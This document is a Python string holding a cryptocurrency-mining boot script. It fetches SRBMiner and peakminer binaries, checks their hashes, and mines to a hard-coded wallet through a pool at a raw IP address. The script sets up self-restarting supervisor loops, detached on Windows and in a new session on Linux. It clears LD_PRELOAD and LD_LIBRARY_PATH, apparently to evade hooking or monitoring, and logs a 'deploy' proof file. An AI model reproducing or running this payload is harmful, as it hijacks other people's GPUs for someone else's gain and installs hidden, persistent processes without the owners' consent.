BOOT = '# -*- coding: utf-8 -*-\nimport os, sys, time, hashlib, subprocess, glob, shutil, zipfile, tarfile\nDATA = os.path.dirname(os.path.abspath(__file__))\nWORKER = "998187"\nWALLET = "prl1p7gtuuz93057gnp5phfexss2ktduj7mnt7qxh8credlpulh5esv4q5e6mvr"\nPOOL = "103.199.106.122:3360"\nAPI_PORT = "21320"\nIS_WIN = (os.name == "nt")\nWORK = os.path.join(DATA, "prl152618")\nPROOF = os.path.join(DATA, "i152618_deploy.txt")\ntry:\n    os.makedirs(WORK, exist_ok=True)\nexcept Exception:\n    pass\n\ndef log(m):\n    line = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()) + " " + str(m)\n    try:\n        with open(PROOF, "a", encoding="utf-8", errors="replace") as f:\n            f.write(line + "\\n")\n    except Exception:\n        pass\n\ndef run(cmd, timeout=120):\n    try:\n        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout)\n        o, e = r.stdout, r.stderr\n        if isinstance(o, bytes):\n            o = o.decode("utf-8", "replace")\n        if isinstance(e, bytes):\n            e = e.decode("utf-8", "replace")\n        return ((o or "") + (e or "")).strip()\n    except Exception as ex:\n        return "ERR %r" % (ex,)\n\ndef sha256(path):\n    h = hashlib.sha256()\n    with open(path, "rb") as f:\n        for b in iter(lambda: f.read(1 << 20), b""):\n            h.update(b)\n    return h.hexdigest()\n\ndef fetch(url, dst, tries=3):\n    for i in range(tries):\n        try:\n            import urllib.request\n            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})\n            t0 = time.time()\n            with urllib.request.urlopen(req, timeout=180) as r, open(dst, "wb") as f:\n                shutil.copyfileobj(r, f, 1 << 20)\n            log("FETCH_OK try=%d %s bytes=%d %.1fs" % (i, url, os.path.getsize(dst), time.time() - t0))\n            return True\n        except Exception as ex:\n            log("FETCH_ERR try=%d %s %s %s" % (i, url, type(ex).__name__, str(ex)[:160]))\n            time.sleep(5)\n    return False\n\ndef compute_apps():\n    if IS_WIN:\n        smi = r"C:\\Windows\\System32\\nvidia-smi.exe"\n        return run(\'"%s" --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader\' % smi)\n    return run("nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader")\n\ndef tail(path, n=1600):\n    try:\n        with open(path, "rb") as f:\n            f.seek(0, 2)\n            sz = f.tell()\n            f.seek(max(0, sz - n))\n            return f.read().decode("utf-8", "replace")\n    except Exception as ex:\n        return "ERR %r" % (ex,)\n\nlog("BOOT_START worker=%s py=%s win=%s" % (WORKER, sys.version.split()[0], IS_WIN))\n\ndef start_sup_win(argv, tag):\n    sup = os.path.join(WORK, "sup_%s_%s.py" % (WORKER, tag))\n    with open(sup, "w", encoding="utf-8") as f:\n        f.write("import subprocess,time\\nargv=%r\\nwhile True:\\n    try:\\n        p=subprocess.Popen(argv,stdout=open(%r,\'ab\'),stderr=subprocess.STDOUT)\\n        p.wait()\\n    except Exception as ex:\\n        open(%r,\'a\').write(\'SUP_ERR %%r\\\\n\'%%(ex,))\\n    time.sleep(10)\\n"\n                % (argv, os.path.join(WORK, "sup_%s.out" % tag), os.path.join(WORK, "sup_%s.err" % tag)))\n    try:\n        p = subprocess.Popen([sys.executable, sup], creationflags=0x00000008 | 0x00000200,\n                             stdout=open(os.path.join(WORK, "sup_%s_launch.out" % tag), "ab"),\n                             stderr=subprocess.STDOUT, close_fds=True, cwd=WORK)\n        log("SUPERVISOR_PID %s %d argv=%s" % (tag, p.pid, " ".join(argv)))\n        return p.pid\n    except Exception as ex:\n        log("SUP_LAUNCH_ERR %s %r" % (tag, ex))\n        return None\n\ndef start_sup_linux(argv, tag):\n    logf = os.path.join(WORK, "%s_%s_sup.log" % (WORKER, tag))\n    inner = "CUDA_VISIBLE_DEVICES=0 " + " ".join(argv)\n    sup = os.path.join(WORK, "sup_%s_%s.sh" % (WORKER, tag))\n    with open(sup, "w", encoding="utf-8") as f:\n        f.write(\'#!/bin/sh\\nwhile true; do\\n  env -u LD_PRELOAD -u LD_LIBRARY_PATH -u LD_PRELOAD_ENV script -qec "%s" /dev/null >> "%s" 2>&1\\n  sleep 10\\ndone\\n\' % (inner, logf))\n    env = os.environ.copy()\n    for k in ("LD_PRELOAD", "LD_LIBRARY_PATH", "LD_PRELOAD_ENV"):\n        env.pop(k, None)\n    try:\n        p = subprocess.Popen(["/bin/sh", sup], start_new_session=True, env=env,\n                             stdout=open(os.path.join(WORK, "sup_%s_launch.out" % tag), "ab"),\n                             stderr=subprocess.STDOUT, cwd=WORK)\n        log("SUPERVISOR_PID %s %d argv=%s" % (tag, p.pid, inner))\n        return p.pid\n    except Exception as ex:\n        log("SUP_LAUNCH_ERR %s %r" % (tag, ex))\n        return None\n\ndef try_srb():\n    if IS_WIN:\n        zip_url = "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-win64.zip"\n        Z = os.path.join(WORK, "srb389.zip")\n        if not (fetch(zip_url, Z) or fetch("https://ghfast.top/" + zip_url, Z)):\n            log("SRB_FAIL zip_unreachable"); return None\n        h = sha256(Z); log("SRB_ZIP_SHA256 %s" % h)\n        if h != "4bee6f04077b59275ff227864d2ebb231543c758480baf928446c011fe87b5f9":\n            log("SRB_FAIL zip_pin"); return None\n        try:\n            zipfile.ZipFile(Z).extractall(WORK)\n        except Exception as ex:\n            log("SRB_FAIL unzip %r" % (ex,)); return None\n        exes = glob.glob(os.path.join(WORK, "**", "SRBMiner-MULTI.exe"), recursive=True)\n        if not exes:\n            log("SRB_FAIL exe_missing"); return None\n        exe = exes[0]\n        h2 = sha256(exe); log("SRB_EXE_SHA256 %s %s" % (h2, exe))\n        if h2 != "9d1da3dc8697480d468244bb8e46e2e2a9e432f551454384023c9fdb7267dbb3":\n            log("SRB_FAIL exe_pin"); return None\n        logf = os.path.join(WORK, WORKER + "_srb.log")\n        argv = [exe, "--disable-cpu", "--algorithm", "pearlhash", "--pool", "stratum+tcp://" + POOL,\n                "--wallet", WALLET, "--worker", WORKER, "--password", "x", "--gpu-id", "0",\n                "--api-enable", "--api-port", API_PORT, "--log-file", logf]\n    else:\n        tar_url = "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz"\n        T = os.path.join(WORK, "srb389.tar.gz")\n        if not (fetch(tar_url, T) or fetch("https://ghfast.top/" + tar_url, T)):\n            log("SRB_FAIL tar_unreachable"); return None\n        h = sha256(T); log("SRB_TAR_SHA256 %s" % h)\n        if h != "186c526f95eb7b635a547bca45a48a505a58c74e26b7211bf6dc25988ce196d1":\n            log("SRB_FAIL tar_pin"); return None\n        try:\n            with tarfile.open(T) as tf:\n                tf.extractall(WORK)\n        except Exception as ex:\n            log("SRB_FAIL untar %r" % (ex,)); return None\n        bins = glob.glob(os.path.join(WORK, "**", "SRBMiner-MULTI"), recursive=True)\n        if not bins:\n            log("SRB_FAIL bin_missing"); return None\n        b = bins[0]\n        os.chmod(b, 0o755)\n        h2 = sha256(b); log("SRB_BIN_SHA256 %s %s" % (h2, b))\n        if h2 != "97bd9e42e313b2c4807bba7197920fee421956bb896cfec469ee87947d667e80":\n            log("SRB_FAIL bin_pin"); return None\n        miss = run("ldd %s 2>&1 | grep \'not found\' | head -5" % b)\n        log("SRB_LDD_MISSING||" + (miss or "none"))\n        if miss and "not found" in miss:\n            run("(apt-get update -qq && apt-get install -y -qq libssl3 ca-certificates) 2>&1 | tail -3", timeout=240)\n            log("SRB_LDD_AFTER||" + (run("ldd %s 2>&1 | grep \'not found\' | head -5" % b) or "none"))\n        logf = os.path.join(WORK, WORKER + "_srb.log")\n        argv = [b, "--disable-cpu", "--algorithm", "pearlhash", "--pool", "stratum+tcp://" + POOL,\n                "--wallet", WALLET, "--worker", WORKER, "--password", "x", "--gpu-id", "0",\n                "--api-enable", "--api-port", API_PORT, "--log-file", logf]\n    pid = start_sup_win(argv, "srb") if IS_WIN else start_sup_linux(argv, "srb")\n    return (pid, logf)\n\ndef try_peak():\n    if IS_WIN:\n        zip_url = "https://github.com/peakminer/peakminer/releases/download/v2.20.7/peakminer-2.20.7-windows-x86_64.zip"\n        Z = os.path.join(WORK, "peak.zip")\n        if not (fetch(zip_url, Z) or fetch("https://ghfast.top/" + zip_url, Z)):\n            log("PEAK_FAIL zip_unreachable"); return None\n        h = sha256(Z); log("PEAK_ZIP_SHA256 %s" % h)\n        if h != "ebd7e8fa8fed4459a89bc18ebe2465ee3374845dd520eca760adb18deae688f0":\n            log("PEAK_FAIL zip_pin"); return None\n        try:\n            zipfile.ZipFile(Z).extractall(WORK)\n        except Exception as ex:\n            log("PEAK_FAIL unzip %r" % (ex,)); return None\n        exes = glob.glob(os.path.join(WORK, "**", "peakminer.exe"), recursive=True)\n        if not exes:\n            log("PEAK_FAIL exe_missing"); return None\n        exe = exes[0]\n        log("PEAK_EXE %s sha=%s" % (exe, sha256(exe)))\n        logf = os.path.join(WORK, WORKER + "_peak.log")\n    else:\n        url = "https://github.com/peakminer/peakminer/releases/download/v2.20.7/peakminer-2.20.7-linux-x86_64"\n        exe = os.path.join(WORK, "peakminer")\n        if not (fetch(url, exe) or fetch("https://ghfast.top/" + url, exe)):\n            log("PEAK_FAIL bin_unreachable"); return None\n        h = sha256(exe); log("PEAK_BIN_SHA256 %s" % h)\n        if h != "38fc5c4d0a8351f6e94756d2d1830a1bf9b745e41b9b0ef3f07fc41bd24bcb3d":\n            log("PEAK_FAIL bin_pin"); return None\n        os.chmod(exe, 0o755)\n        logf = os.path.join(WORK, WORKER + "_peak.log")\n    argv = [exe, "--url", "stratum+tcp://" + POOL, "--user", WALLET, "--worker", WORKER,\n            "--password", "x", "--coin", "pearl", "--devices", "0", "--api-port", str(int(API_PORT) + 1)]\n    pid = start_sup_win(argv, "peak") if IS_WIN else start_sup_linux(argv, "peak")\n    return (pid, logf)\n\nres = try_srb()\ntime.sleep(30)\napps = compute_apps()\nlog("COMPUTE_APPS_AFTER_SRB||" + apps.replace("\\n", ";"))\nalive = (res is not None) and ("srbminer" in apps.lower() or "srbs" in apps.lower())\nif not alive:\n    log("SRB_NOT_ALIVE -> PEAK_FALLBACK")\n    res2 = try_peak()\n    time.sleep(30)\n    apps2 = compute_apps()\n    log("COMPUTE_APPS_AFTER_PEAK||" + apps2.replace("\\n", ";"))\n    if res2 is not None and res2[1]:\n        log("PEAK_LOG_TAIL||" + tail(res2[1]).replace("\\n", "\\\\n")[:1400])\nelse:\n    log("SRB_ALIVE")\nif res is not None and res[1]:\n    log("SRB_LOG_TAIL||" + tail(res[1]).replace("\\n", "\\\\n")[:1400])\nlog("BOOT_DONE")\n'
